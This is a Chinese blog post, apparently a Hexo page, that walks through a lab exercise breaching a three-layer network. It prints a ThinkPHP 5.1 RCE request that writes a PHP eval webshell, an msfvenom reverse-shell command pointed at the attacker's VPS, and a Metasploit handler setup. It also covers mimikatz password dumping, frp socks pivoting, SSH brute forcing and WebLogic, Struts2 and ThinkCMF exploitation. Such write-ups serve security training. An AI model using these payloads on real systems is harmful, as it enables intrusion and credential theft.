@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+
+    
+
+    
+    <title>渗透三层网络 | Hexo</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="渗透,内网穿透" />
+    
+    <meta name="description" content="前言最近做了一个靶场环境，难度不大，属于三层网络结构，从外网开始找到 web 漏洞一步步渗透到内网机器，这里做一个小结。 准备工作 攻击机器 公网 vps 渗透入口（公网）：http:&#x2F;&#x2F;xxx.xxx.x.xx:2780  目标机器1：xxx.xxx.x.xx浏览器访问这个地址 http:&#x2F;&#x2F;xxx.xxx.x.xx:2780，初步进行指纹识别  123web 服务器：apache 2.4.23">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透三层网络">
+<meta property="og:url" content="http://yoursite.com/2020/12/12/%E6%B8%97%E9%80%8F%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言最近做了一个靶场环境，难度不大，属于三层网络结构，从外网开始找到 web 漏洞一步步渗透到内网机器，这里做一个小结。 准备工作 攻击机器 公网 vps 渗透入口（公网）：http:&#x2F;&#x2F;xxx.xxx.x.xx:2780  目标机器1：xxx.xxx.x.xx浏览器访问这个地址 http:&#x2F;&#x2F;xxx.xxx.x.xx:2780，初步进行指纹识别  123web 服务器：apache 2.4.23">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://my.lipeilipei.top/images/2020/20201215222619.png">
+<meta property="article:published_time" content="2020-12-12T04:00:00.000Z">
+<meta property="article:modified_time" content="2020-12-15T14:58:21.882Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="内网穿透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://my.lipeilipei.top/images/2020/20201215222619.png">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/bitbug_favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.5.0/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+        <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?8229091b2a281af4b398716fce50a2cb";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/">Web开发</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E6%B5%8B%E8%AF%95/">测试</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E7%88%AC%E8%99%AB/">爬虫</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/">自动化</a></li></ul>
+                                
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/index.html">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-渗透三层内网" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        渗透三层网络
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+  <div class="article-date">
+    <i class="fa fa-calendar"></i>
+    <a href="/2020/12/12/%E6%B8%97%E9%80%8F%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/" class="article-date">
+       <time datetime="2020-12-12T04:00:00.000Z" itemprop="datePublished">2020-12-12</time>
+    </a>
+  </div>
+
+
+<div class="article-date">
+  <i class="fa fa-calendar-plus-o"></i>
+  <a href="/2020/12/12/%E6%B8%97%E9%80%8F%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/" class="article-date">
+     <time datetime="2020-12-15T14:58:21.882Z" itemprop="dateModified">2020-12-15</time>
+  </a>
+</div>
+
+
+                
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">内网穿透</a>, <a class="tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+    </div>
+
+                
+
+                
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            
+
+            
+
+            
+
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做了一个靶场环境，难度不大，属于三层网络结构，从外网开始找到 web 漏洞一步步渗透到内网机器，这里做一个小结。</p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
+<li>攻击机器</li>
+<li>公网 vps</li>
+<li>渗透入口（公网）：<a href="http://xxx.xxx.x.xx:2780" target="_blank" rel="noopener">http://xxx.xxx.x.xx:2780</a></li>
+</ol>
+<h2 id="目标机器1：xxx-xxx-x-xx"><a href="#目标机器1：xxx-xxx-x-xx" class="headerlink" title="目标机器1：xxx.xxx.x.xx"></a>目标机器1：xxx.xxx.x.xx</h2><p>浏览器访问这个地址 <a href="http://xxx.xxx.x.xx:2780，初步进行指纹识别">http://xxx.xxx.x.xx:2780，初步进行指纹识别</a></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128120018.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web 服务器：apache 2.4.23</span><br><span class="line">系统：windows server</span><br><span class="line">后台语言：php 7.0.12</span><br></pre></td></tr></table></figure>
+
+<p>目录扫描</p>
+<p>dirsearch</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128120642.png" alt="20201128120642"></p>
+<p>扫出不少目录</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201215220844.png" alt="20201215220844"></p>
+<p>通过浏览器访问发现是用 Thinkphp 5.1 搭建的网站，这个版本有 exp 可以直接打</p>
+<p>查看 phpinfo</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>获取到网站根目录</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122100.png" alt="20201128122100"></p>
+<p>写 webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;lipei.php&amp;vars[1][]&#x3D;&lt;?php @eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>写入后的路径在 <a href="http://xxx.xxx.x.xx:2780/public/lipei.php" target="_blank" rel="noopener">http://xxx.xxx.x.xx:2780/public/lipei.php</a></p>
+<p>蚁剑连接成功</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122243.png" alt="20201128122243"></p>
+<p><code>whoami</code> 发现直接就是 system 权限，不用提权了，成功拿下第一个机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122358.png" alt="20201128122358"></p>
+<p>内网探测</p>
+<p><code>ipconfig</code> 查看 IP，发现当前机器的内网 IP 是 <code>172.26.2.182</code>，前面通过浏览器访问的是映射出去的外网 IP</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128122607.png" alt="20201128122607"></p>
+<p>测试的时候不知为何蚁剑频繁报错卡住，改用 msf 上线吧</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128125526.png" alt="20201128125526"></p>
+<p>生成 exe 木马并上传到目标机器（lhost 是 VPS 公网 IP）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=49.xxx.xx.xxx lport=5555 -f exe &gt; pei_1.exe</span><br></pre></td></tr></table></figure>
+
+<p>msf 开启监听</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 127.0.0.1</span><br><span class="line">lhost =&gt; 127.0.0.1</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> exitonsession <span class="literal">false</span> </span><br><span class="line">exitonsession =&gt; <span class="literal">false</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; run -j</span><br></pre></td></tr></table></figure>
+
+<p>在蚁剑上启动木马，上线成功</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128131702.png" alt="20201128131702"></p>
+<p>使用 mimikatz 获取明文密码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz <span class="comment"># 加载 mimikatz 模块</span></span><br><span class="line">wdigest <span class="comment"># 获取明文密码</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://my.lipeilipei.top/images/2020/20201128132927.png" alt="20201128132927"></p>
+<p>明文获取失败，哦前面上传木马的是 32 位的，系统是 64 位的</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128133319.png" alt="20201128133319"></p>
+<p>把进程注入到一个 64 位的以管理员权限运行的程序中，再获取明文</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128133943.png" alt="20201128133943"></p>
+<p>得到一个账号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator  root</span><br></pre></td></tr></table></figure>
+
+<p>搭建好 frp 代理，用上面得到的账号登录远程桌面，但是失败了提示密码不对…</p>
+<blockquote>
+<p>下面对内网的探测都需要设置好用 frp 搭建好的 socks 通道，win 上使用 <code>socksCap64</code> 等工具，linux 可以使用 <code>proxychains</code> 等工具</p>
+</blockquote>
+<p>手动创建一个管理员账号，可以成功登录</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128181153.png" alt="20201128181153"></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128181324.png" alt="20201128181324"></p>
+<p>使用 ping 命令探测一下同网段存活机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,255) do @ ping 172.26.2.%i -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+<p>在目标机器执行上面这条命令不知道为什么一直没有结果，于是上传一个 nbtscan.exe 到目标机器来扫描，探测到在两个网段内除本机之外的另外两个机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128145812.png" alt="20201128145812"></p>
+<p><code>arp -a</code> 命令查看 arp 缓存发现两个网段内还有如下机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128184423.png" alt="20201128184423"></p>
+<p>再用 msf 的探测模块扫描了一番，最终整理一下，发现当前内网其他机器有五个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.26.2.28</span><br><span class="line">172.26.2.174</span><br><span class="line">172.26.3.18</span><br><span class="line">172.26.3.75</span><br><span class="line">172.26.3.78</span><br></pre></td></tr></table></figure>
+
+<p>nmap 扫描端口，socks 通道不能代理 icmp 协议，所以要用 -Pn 参数禁用 ping 扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -T4 172.26.2.28 172.26.2.174 172.26.3.18 172.26.3.75 172.26.3.78</span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 172.26.2.28</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">3389&#x2F;tcp open  ms-wbt-server</span><br><span class="line"></span><br><span class="line"># 172.26.2.174</span><br><span class="line">135&#x2F;tcp   open  msrpc</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds</span><br><span class="line">3389&#x2F;tcp  open  ms-wbt-server</span><br><span class="line"></span><br><span class="line"># 172.26.3.18</span><br><span class="line">135&#x2F;tcp   open  msrpc</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds</span><br><span class="line">3389&#x2F;tcp  open  ms-wbt-server</span><br><span class="line"></span><br><span class="line"># 172.26.3.75</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">111&#x2F;tcp  open  rpcbind</span><br><span class="line">7777&#x2F;tcp open  cbt</span><br><span class="line">8009&#x2F;tcp open  ajp13</span><br><span class="line">8080&#x2F;tcp open  http-proxy</span><br><span class="line"></span><br><span class="line"># 172.26.3.78</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">7001&#x2F;tcp open  afs3-callback</span><br><span class="line">7778&#x2F;tcp open  interwise</span><br></pre></td></tr></table></figure>
+
+
+<p>发现里面有三个机器开了 22 端口，爆破一下 ssh，果然有一台 172.26.2.28 是弱口令</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128192904.png" alt="20201128192904"></p>
+<p>ssh 登录成功，是一台 kali，成功拿下第二个机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128193426.png" alt="20201128193426"></p>
+<h2 id="目标机器二：172-26-2-174-172-26-3-18"><a href="#目标机器二：172-26-2-174-172-26-3-18" class="headerlink" title="目标机器二：172.26.2.174 / 172.26.3.18"></a>目标机器二：172.26.2.174 / 172.26.3.18</h2><p>发现同网段另一个机器 172.26.2.174 和 172.26.3.18 都开放了 445 端口，测试一下 17-010 漏洞</p>
+<p>确定这两个都存在 17010 漏洞</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128154016.png" alt="20201128154016"></p>
+<p>但是尝试了几次都是攻击失败</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128160219.png" alt="20201128160219"></p>
+<p>这俩机器还开了 3389 端口，通过 socks 通道打开远程桌面连接工具，使用前面收集到的那个密码试一下，额，都登录失败，密码好像不对</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201128161356.png" alt="20201128161356"></p>
+<h2 id="目标机器三：172-26-3-78"><a href="#目标机器三：172-26-3-78" class="headerlink" title="目标机器三：172.26.3.78"></a>目标机器三：172.26.3.78</h2><p>这个机器开放了 7001 端口，是 weblogic 的默认端口，浏览器挂好代理访问发现确实是 weblogic 默认的 404 页面</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201129135402.png" alt="20201129135402"></p>
+<p>经过探测存在几个 CVE 漏洞</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201129135233.png" alt="20201129135233"></p>
+<p>访问 weblogic 的默认登录页面，版本是 10.3.6，后台语言是 jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;console&#x2F;login&#x2F;LoginForm.jsp</span><br></pre></td></tr></table></figure>
+<p><img src="http://my.lipeilipei.top/images/2020/20201129142341.png" alt="20201129142341"></p>
+<p>CVE-2019-2725 来手工验证，确实存在</p>
+<p><img src="http://my.lipeilipei.top/images/2020/9FA90A9642C33200413AD04ED604B525.jpg" alt=""></p>
+<p>上传冰蝎的 jsp 马</p>
+<p><img src="http://my.lipeilipei.top/images/2020/QQ%E5%9B%BE%E7%89%8720201201202814.png" alt=""></p>
+<p>webshell 连接成功，是 root 权限，拿下第三台机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/12wqeqwe.png" alt="12wqeqwe"></p>
+<p>这个机器还存在 172.26.4.0/24 网段，先记录下来</p>
+<h2 id="目标机器四：172-26-3-75"><a href="#目标机器四：172-26-3-75" class="headerlink" title="目标机器四：172.26.3.75"></a>目标机器四：172.26.3.75</h2><p>这个机器开放了 8080 端口，是个 web 服务</p>
+<p><img src="http://my.lipeilipei.top/images/2020/EDEA53BD959197B405B01F7327A22B63.jpg" alt=""></p>
+<p>使用 <code>vulmap</code> 脚本探测后发现是 struts2 框架，并且存在 S2-045 漏洞</p>
+<p><img src="http://my.lipeilipei.top/images/2020/DAB93D2FCC4D8839DCA205E597F7FAFB.jpg" alt=""></p>
+<p>直接用该脚本自带的打 EXP 失败</p>
+<p><img src="http://my.lipeilipei.top/images/2020/AB3EAB582AAF2492EF243F8269691241.png" alt=""></p>
+<p>换一个 struts2 利用工具，命令执行成功，当前是 root 权限，拿下第四个机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/39DBA0A9D943330F9D36E031289243DC.png" alt=""></p>
+<p>上传冰蝎的 jsp 马</p>
+<p><img src="http://my.lipeilipei.top/images/2020/1058772019FD9EB1580CACF82096A10D.png" alt=""></p>
+<h2 id="目标机器五：172-26-4-22-（第二层内网）"><a href="#目标机器五：172-26-4-22-（第二层内网）" class="headerlink" title="目标机器五：172.26.4.22 （第二层内网）"></a>目标机器五：172.26.4.22 （第二层内网）</h2><p>在前面 welogic 那个机器上发现另一个 172.26.4.0/24 网段</p>
+<p>上传 ping 检测内网存活主机的脚本，测试的时候网络好像很不稳定，上传成功并且给了执行权限，但是一直提示文件不存在</p>
+<p><img src="http://my.lipeilipei.top/images/2020/FB3EDDAA9808CEB701ED95567447C95E.png" alt=""></p>
+<p>变通一下，生成一个 msf 的正向连接的木马上传到目标机器，可以成功弹回 session</p>
+<p><img src="http://my.lipeilipei.top/images/2020/5513373A8385D139F163EF2F238A542A.jpg" alt=""></p>
+<p>然而….很快又断开连接了，估计还是网络不稳定</p>
+<p><img src="http://my.lipeilipei.top/images/2020/8160D730594AE97E00261F9387717077.jpg" alt=""></p>
+<p><code>arp -a</code> 查看网络缓存发现了另一个机器 172.26.4.22</p>
+<p><img src="http://my.lipeilipei.top/images/2020/302F97E0E7F4A759DC8D5773885A5E65.png" alt=""></p>
+<p>现在还需要设置好第二层的 socks 代理，攻击机才能访问这个 4 网段的机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 172.26.3.63</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[socks_2_3]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 10067</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure>
+
+<p>上传 frpc 客户端到 weblogic 这个机器，配置文件内容如上，服务端的地址填写拿到的第一个机器的 172.26.3.63 网段的IP</p>
+<blockquote>
+<p>前提：第一个机器上启动 frpc 客户段的时候设置好了，并且开启了一个 frps 服务端</p>
+</blockquote>
+<p><img src="http://my.lipeilipei.top/images/2020/04C2C769F9AEC45CAC31BB85116E3E79.png" alt=""></p>
+<p>设置 proxychains，nmap 扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 172.26.4.22</span><br><span class="line">21&#x2F;tcp   open  ftp</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">135&#x2F;tcp  open  msrpc</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds</span><br><span class="line">1025&#x2F;tcp open  NFS-or-IIS</span><br><span class="line">1026&#x2F;tcp open  LSA-or-nterm</span><br><span class="line">1027&#x2F;tcp open  IIS</span><br><span class="line">1028&#x2F;tcp open  unknown</span><br><span class="line">1045&#x2F;tcp open  fpitp</span><br><span class="line">1046&#x2F;tcp open  wfremotertm</span><br><span class="line">3306&#x2F;tcp open  mysql</span><br><span class="line">3389&#x2F;tcp open  ms-wbt-server</span><br></pre></td></tr></table></figure>
+<p>这个机器开放的端口挺多，80 端口是 web服务，浏览器设置好代理，访问发现是 thinkCMF 框架搭建的网站，版本是 2.2.0</p>
+<p><img src="http://my.lipeilipei.top/images/2020/35D1689EFBA8ED9052D2DE4709977254.jpg" alt=""></p>
+<p>这个版本有任意文件上传的漏洞，修改后直接请求就能写 webshell 成功<br><a href="https://mrxn.net/Infiltration/644.html" target="_blank" rel="noopener">https://mrxn.net/Infiltration/644.html</a></p>
+<p><img src="http://my.lipeilipei.top/images/2020/3F4F12E5C5ECB8FC968D46BD0208B96E.jpg" alt=""></p>
+<p>出现这个报错页面实际上已经写成功了，文件写在了网站根目录下</p>
+<p><img src="http://my.lipeilipei.top/images/2020/4DD620378DFEA52CC9DBA4B10A529267.png" alt=""></p>
+<p><img src="http://my.lipeilipei.top/images/2020/FD34DF87C3497B32BAD8D6088504AC98.png" alt=""></p>
+<p>蚁剑设置好代理，连接 webshell，命令执行发现是 system权限，成功拿下第五台机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/B5609320DA5DC631012503C2D9735382.jpg" alt=""></p>
+<h2 id="整理一下网络拓扑图"><a href="#整理一下网络拓扑图" class="headerlink" title="整理一下网络拓扑图"></a>整理一下网络拓扑图</h2><p><img src="http://my.lipeilipei.top/images/2020/20201215222619.png" alt="20201215222619"></p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more">分享到：</a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间">QQ空间</a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a>
+    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博">腾讯微博</a>
+    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网">人人网</a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a>
+</div>
+<script>
+window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{"bdSize":16}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+<style>
+    .bdshare_popup_box {
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .bdshare-button-style0-16 a,
+    .bdshare-button-style0-16 .bds_more {
+        padding-left: 20px;
+        margin: 6px 10px 6px 0;
+    }
+    .bdshare_dialog_list a,
+    .bdshare_popup_list a,
+    .bdshare_popup_bottom a {
+        font-family: 'Microsoft Yahei';
+    }
+    .bdshare_popup_top {
+        display: none;
+    }
+    .bdshare_popup_bottom {
+        height: auto;
+        padding: 5px;
+    }
+</style>
+
+
+
+        </footer>
+    </div>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "John Doe"
+        },
+        "headline": "渗透三层网络",
+        "image": "http://yoursite.comhttp://my.lipeilipei.top/images/2020/20201215222619.png",
+        "keywords": "渗透 内网穿透",
+        "genre": "安全",
+        "datePublished": "2020-12-12",
+        "dateCreated": "2020-12-12",
+        "dateModified": "2020-12-15",
+        "url": "http://yoursite.com/2020/12/12/渗透三层内网/",
+        "description": "前言最近做了一个靶场环境，难度不大，属于三层网络结构，从外网开始找到 web 漏洞一步步渗透到内网机器，这里做一个小结。
+准备工作
+攻击机器
+公网 vps
+渗透入口（公网）：http://xxx.xxx.x.xx:2780
+
+目标机器1：xxx.xxx.x.xx浏览器访问这个地址 http://xxx.xxx.x.xx:2780，初步进行指纹识别
+
+123web 服务器：apache 2.4.23",
+        "wordCount": 742
+    }
+</script>
+
+</article>
+
+    <section id="comments">
+    
+    </section>
+
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/peilipeili" target="_blank" rel="noopener">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2020/12/10/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">域内密码凭证获取</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/12/12/%E6%B8%97%E9%80%8F%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/" class="thumbnail">
+    
+    
